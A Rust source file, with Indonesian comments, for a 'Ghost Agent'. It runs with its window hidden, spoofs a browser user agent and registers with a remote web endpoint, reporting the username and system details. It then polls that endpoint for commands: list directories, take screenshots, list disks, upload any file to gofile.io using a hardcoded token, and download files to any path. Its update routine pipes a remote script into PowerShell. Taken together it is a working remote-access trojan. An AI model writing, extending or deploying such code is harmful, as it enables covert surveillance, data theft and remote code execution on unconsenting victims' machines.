#![windows_subsystem = "windows"]
use std::fs;
use std::io::Write;
use std::path::Path;
use std::collections::HashMap;
use std::time::{Instant, Duration};
use std::sync::{Arc, Mutex};
use tokio::time::sleep;
use serde::{Deserialize, Serialize};
use sysinfo::{System, SystemExt, DiskExt, CpuExt}; 
use reqwest::Client;
use screenshots::Screen;
use uuid::Uuid;
use base64::{Engine as _, engine::general_purpose}; 
use whoami;

const VERSION: &str = "2.4";

// --- CONFIGURATION STRUCT ---
// Fix: Tambahkan 'Serialize' agar bisa disimpan kembali ke JSON
#[derive(Serialize, Deserialize, Clone)]
struct Config {
    api_url: String,
    device_name: String,
    heartbeat_interval_ms: u64,
    poll_interval_ms: u64,
    gofile_token: String,
    #[serde(default)]
    device_id: String,
}

// --- PAYLOAD STRUCTS ---
#[derive(Serialize)]
struct HeartbeatPayload {
    action: String,
    device_id: String,
    device_name: String,
    ram_usage: u64, // in MB
    ram_total: u64, // in MB
    cpu_usage: f32, // fraction 0.0-100.0
    cpu_brand: String,
    platform: String,
    os_type: String,
    user: String,
    version: String,
}

#[derive(Serialize)]
struct CommandResponse {
    action: String,
    device_id: String,
    reply_to_id: String,
    status: String,
    data: Option<serde_json::Value>,
}

#[derive(Deserialize, Debug)]
#[serde(rename_all = "camelCase")]
struct PendingCommand {
    message_id: String, // Will map to "messageId"
    command: String,
    args: Option<serde_json::Value>, // Changed to Value to be more flexible
}

#[derive(Serialize, Clone)]
struct FileEntry {
    name: String,
    kind: String,
    size: String,
}

// --- CACHE STRUCT ---
struct CacheEntry {
    files: Vec<FileEntry>,
    timestamp: Instant,
}

struct DirCache {
    entries: HashMap<String, CacheEntry>,
    ttl: Duration,
}

impl DirCache {
    fn new(ttl_secs: u64) -> Self {
        Self {
            entries: HashMap::new(),
            ttl: Duration::from_secs(ttl_secs),
        }
    }

    fn get(&self, path: &str) -> Option<Vec<FileEntry>> {
        if let Some(entry) = self.entries.get(path) {
            if entry.timestamp.elapsed() < self.ttl {
                return Some(entry.files.clone());
            }
        }
        None
    }

    fn set(&mut self, path: String, files: Vec<FileEntry>) {
        self.entries.insert(path, CacheEntry {
            files,
            timestamp: Instant::now(),
        });
    }

    fn invalidate(&mut self, path: &str) {
        self.entries.remove(path);
    }
}

// --- MAIN LOGIC ---

#[tokio::main]
async fn main() {
    println!("👻 Ghost Agent v{} - Connectivity Debug Active...", VERSION);

    let config = load_or_create_config();
    println!("📱 [READY] Device ID: {}", config.device_id);
    println!("🌐 [TARGET] API URL  : {}", config.api_url);
    
    let client = Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        .build()
        .unwrap();

    // 1. Check for updates
    if let Some(new_version) = check_for_updates(&client, &config.api_url).await {
        println!("🚀 New version found: v{}. Updating...", new_version);
        trigger_update();
        // Give time for update process to start and then exit
        sleep(Duration::from_secs(3)).await;
        // The update script will kill this process anyway, but let's be graceful
        std::process::exit(0);
    }

    // 2. Initial Registration & Heartbeat Task
    println!("📡 Sending initial heartbeat to register device...");
    let initial_sys = System::new_all();
    let initial_payload = HeartbeatPayload {
        action: "heartbeat".to_string(),
        device_id: config.device_id.clone(),
        device_name: config.device_name.clone(),
        ram_usage: initial_sys.used_memory() / 1024 / 1024,
        ram_total: initial_sys.total_memory() / 1024 / 1024,
        cpu_usage: 0.0,
        cpu_brand: initial_sys.global_cpu_info().brand().to_string(),
        platform: format!("{} {}", initial_sys.name().unwrap_or_default(), initial_sys.os_version().unwrap_or_default()),
        os_type: initial_sys.distribution_id(),
        user: whoami::username(),
        version: VERSION.to_string(),
    };
    
    // Attempt initial heartbeat, log but don't panic if it fails
    match client.post(&config.api_url).json(&initial_payload).send().await {
        Ok(_) => println!("✅ Initial registration successful!"),
        Err(e) => println!("⚠️ Initial registration failed: {}. Will retry in background loop.", e),
    }

    let hb_config = config.clone();
    let hb_client = client.clone();
    
    tokio::spawn(async move {
        let mut sys = System::new_all();
        loop {
            sys.refresh_memory();
            sys.refresh_cpu();
            
            let cpu_brand = sys.global_cpu_info().brand().to_string();
            let cpu_usage = sys.global_cpu_info().cpu_usage();
            
            let payload = HeartbeatPayload {
                action: "heartbeat".to_string(),
                device_id: hb_config.device_id.clone(),
                device_name: hb_config.device_name.clone(),
                ram_usage: sys.used_memory() / 1024 / 1024,
                ram_total: sys.total_memory() / 1024 / 1024,
                cpu_usage,
                cpu_brand,
                platform: format!("{} {}", sys.name().unwrap_or_default(), sys.os_version().unwrap_or_default()),
                os_type: sys.distribution_id(),
                user: whoami::username(),
                version: VERSION.to_string(),
            };

            let res = hb_client.post(&hb_config.api_url).json(&payload).send().await;
            if let Err(e) = res {
                println!("❌ Heartbeat Error: {}. Check connectivity or API URL.", e);
            }
            sleep(Duration::from_millis(hb_config.heartbeat_interval_ms)).await;
        }
    });

    let dir_cache = Arc::new(Mutex::new(DirCache::new(60))); // Cache for 1 minute

    // 3. Command Polling Loop
    loop {
        print!("."); 
        std::io::stdout().flush().unwrap();
        match fetch_command(&client, &config).await {
            Ok(Some(cmd)) => {
                println!("📩 Command: {} Args: {:?}", cmd.command, cmd.args);
                let cache_clone = Arc::clone(&dir_cache);
                process_command(&client, &config, cmd, cache_clone).await;
            }
            Err(e) => println!("⚠️ Poll Error: {}", e),
            _ => {}
        }
        sleep(Duration::from_millis(config.poll_interval_ms)).await;
    }
}

// --- UTILS ---

fn load_or_create_config() -> Config {
    let path = "config.json";
    let (mut cfg, is_new) = if Path::new(path).exists() {
        let content = fs::read_to_string(path).unwrap();
        (serde_json::from_str::<Config>(&content).unwrap_or_else(|_| {
            println!("⚠️ Config rusak, reset...");
            create_default_config(path)
        }), false)
    } else {
        (create_default_config(path), true)
    };

    // Auto-generate Device ID if missing (and it's not a newly created config which already has one)
    if !is_new && cfg.device_id.is_empty() {
        cfg.device_id = Uuid::new_v4().to_string();
        save_config(path, &cfg);
        println!("🆔 Generated and saved new Device ID: {}", cfg.device_id);
    }

    // 🚀 TRUE AUTO-ADAPT:
    if cfg!(debug_assertions) {
        println!("🛠️  [DEV MODE] Auto-switching API to http://127.0.0.1:3000/api/ghost");
        cfg.api_url = "http://127.0.0.1:3000/api/ghost".to_string();
    } else {
        println!("🌐 [PROD MODE] Connecting to: {}", cfg.api_url);
    }
    
    cfg
}

fn create_default_config(path: &str) -> Config {
    let username = whoami::username();
    let devicename = whoami::devicename();
    
    let default_cfg = Config {
        api_url: "https://erzysh.vercel.app/api/ghost".to_string(),
        device_name: format!("{}-{}", username, devicename),
        heartbeat_interval_ms: 5000,
        poll_interval_ms: 2000,
        gofile_token: "eNi42POOnDBiGBWf9LfDOP2Yjoe7DqQy".to_string(),
        device_id: Uuid::new_v4().to_string(),
    };

    save_config(path, &default_cfg);
    default_cfg
}

fn save_config(path: &str, config: &Config) {
    let json = serde_json::to_string_pretty(config).unwrap();
    let mut file = fs::File::create(path).expect("Gagal membuat file config");
    file.write_all(json.as_bytes()).expect("Gagal menulis config");
}

async fn fetch_command(client: &Client, config: &Config) -> Result<Option<PendingCommand>, Box<dyn std::error::Error>> {
    let url = format!("{}?deviceId={}", config.api_url, config.device_id);
    let resp = client.get(&url).send().await?;
    
    if resp.status().is_success() {
        let text = resp.text().await?;
        if text.trim().is_empty() || text == "null" { return Ok(None); }
        
        match serde_json::from_str::<PendingCommand>(&text) {
            Ok(cmd) => return Ok(Some(cmd)),
            Err(e) => {
                println!("❌ JSON Parse Error: {}. Raw text: {}", e, text);
            }
        }
    } else {
        println!("⚠️ Poll Status: {} for {}", resp.status(), url);
    }
    Ok(None)
}

async fn process_command(client: &Client, config: &Config, cmd: PendingCommand, cache: Arc<Mutex<DirCache>>) {
    let mut response_data: Option<serde_json::Value> = None;
    let mut status = "DONE".to_string();

    match cmd.command.as_str() {
        "LS" => {
            let mut path_str = "C:\\".to_string();
            let mut force = false;

            if let Some(args) = &cmd.args {
                if let Some(s) = args.as_str() {
                    path_str = s.to_string();
                } else if let Some(obj) = args.as_object() {
                    if let Some(p) = obj.get("path").and_then(|v| v.as_str()) {
                        path_str = p.to_string();
                    }
                    force = obj.get("force").and_then(|v| v.as_bool()).unwrap_or(false);
                }
            }
            
            let path = Path::new(&path_str);
            
            if !path.exists() {
                status = "ERROR".to_string();
                response_data = Some(serde_json::json!({ "message": "Path not found" }));
            } else {
                // Check Cache First (Unless force is true)
                let cached_files = if force {
                    None
                } else {
                    let cache_lock = cache.lock().unwrap();
                    cache_lock.get(&path_str)
                };

                if let Some(files) = cached_files {
                    println!("⚡ [CACHE] Returning cached results for: {}", path_str);
                    response_data = Some(serde_json::json!({ "current_path": path_str, "files": files }));
                } else {
                    match fs::read_dir(path) {
                        Ok(entries) => {
                            let mut files: Vec<FileEntry> = Vec::new();
                            for entry in entries {
                                if let Ok(entry) = entry {
                                    let name = entry.file_name().to_string_lossy().to_string();
                                    if let Ok(meta) = entry.metadata() {
                                        files.push(FileEntry {
                                            name,
                                            kind: if meta.is_dir() { "dir".to_string() } else { "file".to_string() },
                                            size: if meta.is_dir() { "-".to_string() } else { format_size(meta.len()) }
                                        });
                                    } else {
                                        files.push(FileEntry { name, kind: "unknown".to_string(), size: "?".to_string() });
                                    }
                                }
                            }
                            files.sort_by(|a, b| {
                                if a.kind == b.kind { a.name.cmp(&b.name) } 
                                else if a.kind == "dir" { std::cmp::Ordering::Less } 
                                else { std::cmp::Ordering::Greater }
                            });

                            // Save to Cache
                            {
                                let mut cache_lock = cache.lock().unwrap();
                                cache_lock.set(path_str.clone(), files.clone());
                            }

                            response_data = Some(serde_json::json!({ "current_path": path_str, "files": files }));
                        }
                        Err(e) => {
                            status = "ERROR".to_string();
                            response_data = Some(serde_json::json!({ "message": format!("Access Denied: {}", e) }));
                        }
                    }
                }
            }
        },
        "SCREENSHOT" => {
            let screens = Screen::all().unwrap_or_default();
            if let Some(screen) = screens.first() {
                match screen.capture() {
                    Ok(image) => {
                        let mut cursor = std::io::Cursor::new(Vec::new());
                        let _ = image.write_to(&mut cursor, image::ImageOutputFormat::Png);
                        
                        let b64 = general_purpose::STANDARD.encode(cursor.get_ref());
                        response_data = Some(serde_json::json!({ "image": b64 }));
                    },
                    Err(e) => {
                        status = "ERROR".to_string();
                        response_data = Some(serde_json::json!({ "message": e.to_string() }));
                    }
                }
            }
        },
        "LIST_DISKS" => {
            let mut sys = System::new_all();
            sys.refresh_disks_list();
            sys.refresh_disks();
            
            let mut disks: Vec<serde_json::Value> = Vec::new();
            for disk in sys.disks() {
                disks.push(serde_json::json!({
                    "name": disk.name().to_string_lossy().to_string(),
                    "mount_point": disk.mount_point().to_string_lossy().to_string(),
                    "total_space": format_size(disk.total_space()),
                    "available_space": format_size(disk.available_space()),
                    "file_system": String::from_utf8_lossy(disk.file_system()).to_string(),
                }));
            }
            response_data = Some(serde_json::json!({ "disks": disks }));
        },
        "GET_FILE" => {
            let path_str = cmd.args.as_ref()
                .and_then(|v| v.as_str())
                .unwrap_or_default()
                .to_string();
            match upload_to_gofile(client, &path_str, &config.gofile_token).await {
                Ok(url) => response_data = Some(serde_json::json!({ "url": url })),
                Err(e) => {
                    status = "ERROR".to_string();
                    response_data = Some(serde_json::json!({ "message": e.to_string() }));
                }
            }
        },
       "PUT_FILE" => {
            println!("📥 Processing PUT_FILE command...");
            if let Some(json) = cmd.args {
                let url = json["url"].as_str().unwrap_or_default();
                let dest = json["dest"].as_str().unwrap_or_default();
                
                if url.is_empty() || dest.is_empty() {
                    status = "ERROR".to_string();
                    response_data = Some(serde_json::json!({ "message": "Missing 'url' or 'dest' in arguments" }));
                } else {
                    println!("📡 Downloading from: {}", url);
                    println!("🎯 Destination: {}", dest);

                    if let Some(parent) = Path::new(dest).parent() {
                        let parent_str = parent.to_string_lossy().to_string();
                        if let Err(e) = fs::create_dir_all(parent) {
                            println!("⚠️ Failed to create directory: {}", e);
                        }
                        // Invalidate cache for parent directory
                        {
                            let mut cache_lock = cache.lock().unwrap();
                            cache_lock.invalidate(&parent_str);
                            println!("🧹 [CACHE] Invalidated: {}", parent_str);
                        }
                    }

                    let referer = url.replace("/dl/", "/");
                    let req = client.get(url)
                        .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
                        .header("Accept-Language", "en-US,en;q=0.9")
                        .header("Referer", referer)
                        .header("Upgrade-Insecure-Requests", "1")
                        .header("Connection", "keep-alive");

                    match req.send().await {
                        Ok(resp) => {
                            let final_url = resp.url().clone();
                            if resp.status().is_success() {
                                let content_type = resp.headers()
                                    .get("content-type")
                                    .and_then(|v| v.to_str().ok())
                                    .unwrap_or("none");
                                let content_length = resp.content_length().unwrap_or(0);
                                
                                println!("📦 Received response from: {}", final_url);
                                println!("📦 Type: {}, Size: {} bytes", content_type, content_length);

                                if content_type.contains("text/html") {
                                     println!("⚠️ Response is HTML. Attempting to parse for direct link...");
                                     match resp.bytes().await {
                                         Ok(body_bytes) => {
                                             let body_str = String::from_utf8_lossy(&body_bytes);
                                             let mut new_url = String::new();
                                             
                                             if let Some(idx) = body_str.find("tmpfiles.org/dl/") {
                                                 let prefix = &body_str[0..idx];
                                                 if let Some(start_quote) = prefix.rfind('"').or_else(|| prefix.rfind('\'')).or_else(|| prefix.rfind(' ')) {
                                                     let start = start_quote + 1;
                                                     let suffix = &body_str[idx..];
                                                     if let Some(end_quote) = suffix.find('"').or_else(|| suffix.find('\'')).or_else(|| suffix.find(' ')) {
                                                         let end = idx + end_quote;
                                                         new_url = body_str[start..end].to_string();
                                                         if new_url.starts_with("//") {
                                                             new_url = format!("https:{}", new_url);
                                                         }
                                                     }
                                                 }
                                             }

                                             if !new_url.is_empty() {
                                                 println!("🔗 Found direct link in HTML: {}", new_url);
                                                 let retry_req = client.get(&new_url).header("Referer", url);
                                                 match retry_req.send().await {
                                                     Ok(retry_resp) => {
                                                         if retry_resp.status().is_success() {
                                                             match retry_resp.bytes().await {
                                                                 Ok(retry_bytes) => {
                                                                     if std::fs::write(dest, &retry_bytes).is_ok() {
                                                                         println!("✅ File saved successfully from direct link!");
                                                                         response_data = Some(serde_json::json!({ "dest": dest, "recovered": true }));
                                                                         status = "DONE".to_string();
                                                                     } else {
                                                                         status = "ERROR".to_string();
                                                                         response_data = Some(serde_json::json!({ "message": "Failed to write retry content" })); 
                                                                     }
                                                                 },
                                                                 Err(e) => {
                                                                     status = "ERROR".to_string();
                                                                     response_data = Some(serde_json::json!({ "message": format!("Retry byte error: {}", e) }));
                                                                 }
                                                             }
                                                         } else {
                                                             status = "ERROR".to_string();
                                                             response_data = Some(serde_json::json!({ "message": format!("Retry failed: HTTP {}", retry_resp.status()) }));
                                                         }
                                                     },
                                                     Err(e) => {
                                                         status = "ERROR".to_string();
                                                         response_data = Some(serde_json::json!({ "message": format!("Retry request failed: {}", e) }));
                                                     }
                                                 }
                                             } else {
                                                 println!("❌ Could not find /dl/ link in HTML");
                                                 status = "ERROR".to_string();
                                                 response_data = Some(serde_json::json!({ "message": "HTML received but no direct link found" }));
                                             }
                                         },
                                         Err(e) => {
                                             status = "ERROR".to_string();
                                             response_data = Some(serde_json::json!({ "message": format!("Failed to read HTML body: {}", e) }));
                                         }
                                     }
                                } else {
                                    match resp.bytes().await {
                                        Ok(bytes) => {
                                            if bytes.is_empty() {
                                                status = "ERROR".to_string();
                                                response_data = Some(serde_json::json!({ "message": "Downloaded file is empty" }));
                                            } else if let Err(e) = std::fs::write(dest, &bytes) {
                                                status = "ERROR".to_string();
                                                response_data = Some(serde_json::json!({ "message": format!("Write error: {}", e) }));
                                                println!("❌ Write error: {}", e);
                                            } else {
                                                println!("✅ File saved successfully! ({} bytes)", bytes.len());
                                                response_data = Some(serde_json::json!({ "dest": dest, "size": bytes.len() }));
                                            }
                                        },
                                        Err(e) => {
                                            status = "ERROR".to_string();
                                            response_data = Some(serde_json::json!({ "message": format!("Byte stream error: {}", e) }));
                                            println!("❌ Byte stream error: {}", e);
                                        }
                                    }
                                }
                            } else {
                                status = "ERROR".to_string();
                                let err_msg = format!("Download failed (HTTP {}): The link might be expired or restricted.", resp.status());
                                response_data = Some(serde_json::json!({ "message": err_msg }));
                                println!("❌ {} at {}", err_msg, final_url);
                            }
                        },
                        Err(e) => {
                            status = "ERROR".to_string();
                            response_data = Some(serde_json::json!({ "message": format!("Request fault: {}", e) }));
                            println!("❌ Request fault: {}", e);
                        }
                    }
                }
            } else {
                status = "ERROR".to_string();
                response_data = Some(serde_json::json!({ "message": "No arguments provided for PUT_FILE" }));
                println!("❌ No arguments provided");
            }
        }
        _ => {
            status = "ERROR".to_string();
            response_data = Some(serde_json::json!({ "message": "Unknown command" }));
        }
    }

    let payload = CommandResponse {
        action: "response".to_string(),
        device_id: config.device_id.clone(),
        reply_to_id: cmd.message_id,
        status,
        data: response_data,
    };

    let res = client.post(&config.api_url).json(&payload).send().await;
    match res {
        Ok(resp) => {
            println!("📤 Response sent (Status: {}). API returned: {}", payload.status, resp.status());
        },
        Err(e) => {
            println!("❌ Failed to send response: {}", e);
        }
    }
}

fn format_size(bytes: u64) -> String {
    const UNITS: [&str; 4] = ["B", "KB", "MB", "GB"];
    let mut b = bytes as f64;
    let mut i = 0;
    while b >= 1024.0 && i < UNITS.len() - 1 {
        b /= 1024.0;
        i += 1;
    }
    format!("{:.2} {}", b, UNITS[i])
}

async fn upload_to_gofile(client: &Client, file_path: &str, token: &str) -> Result<String, Box<dyn std::error::Error>> {
    // Fix: tokio_util sekarang sudah diimport di Cargo.toml
    use tokio_util::codec::{BytesCodec, FramedRead};
    use tokio::fs::File;
    
    let path = Path::new(file_path);
    if !path.exists() { return Err("File not found".into()); }

    let file = File::open(file_path).await?;
    let stream = FramedRead::new(file, BytesCodec::new());
    let file_body = reqwest::Body::wrap_stream(stream);
    let filename = path.file_name().unwrap().to_string_lossy().to_string();

    let form = reqwest::multipart::Form::new()
        .part("file", reqwest::multipart::Part::stream(file_body).file_name(filename));

    let upload_resp = client.post("https://upload-ap-sgp.gofile.io/uploadFile")
        .header("Authorization", format!("Bearer {}", token))
        .multipart(form)
        .send()
        .await?;

    let json: serde_json::Value = upload_resp.json().await?;
    
    if json["status"].as_str().unwrap_or("") == "ok" {
        Ok(json["data"]["downloadPage"].as_str().unwrap_or("").to_string())
    } else {
        Err(format!("Gofile error: {:?}", json).into())
    }
}

async fn check_for_updates(client: &Client, api_url: &str) -> Option<String> {
    let url = format!("{}?action=get_version", api_url);
    match client.get(&url).send().await {
        Ok(resp) => {
            if let Ok(json) = resp.json::<serde_json::Value>().await {
                if let Some(latest_version) = json["version"].as_str() {
                    if latest_version != VERSION {
                        return Some(latest_version.to_string());
                    }
                }
            }
        }
        Err(e) => println!("⚠️ Failed to check version: {}", e),
    }
    None
}

fn trigger_update() {
    println!("🔄 Triggering powershell update script...");
    // PowerShell command to download and run the setup script
    // Note: The script will handle killing the current process and restarting it
    let cmd = "curl -sL https://erzysh.vercel.app/ghost-setup | powershell";
    
    if let Err(e) = std::process::Command::new("powershell")
        .args(&["-Command", cmd])
        .spawn() {
        println!("❌ Failed to trigger update: {}", e);
    }
}
```